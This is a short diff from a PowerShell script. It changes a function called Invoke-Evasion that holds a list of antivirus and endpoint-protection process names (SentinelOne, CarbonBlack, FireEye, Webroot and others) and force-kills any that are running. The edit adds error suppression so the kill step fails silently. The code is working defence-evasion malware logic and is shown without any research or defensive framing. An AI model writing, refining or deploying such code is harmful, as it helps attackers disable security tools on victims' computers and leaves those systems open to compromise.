@@ -172,7 +172,7 @@ function Invoke-Evasion {
         'SentinelOne', 'CarbonBlack', 'FireEye', 'PaloAlto', 'Fortinet', 'McShield', 'SAVAdmin',
         'V3Svc', 'AhnLab', 'QuickHeal', 'TotalAV', 'Webroot', 'ZoneAlarm', 'BullGuard', 'VIPRE'
     )
-    Get-Process $targetProcesses -ErrorAction SilentlyContinue | Stop-Process -Force
+    Get-Process $targetProcesses -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
   
     Write-Log "[EVASION] Complete"
 }
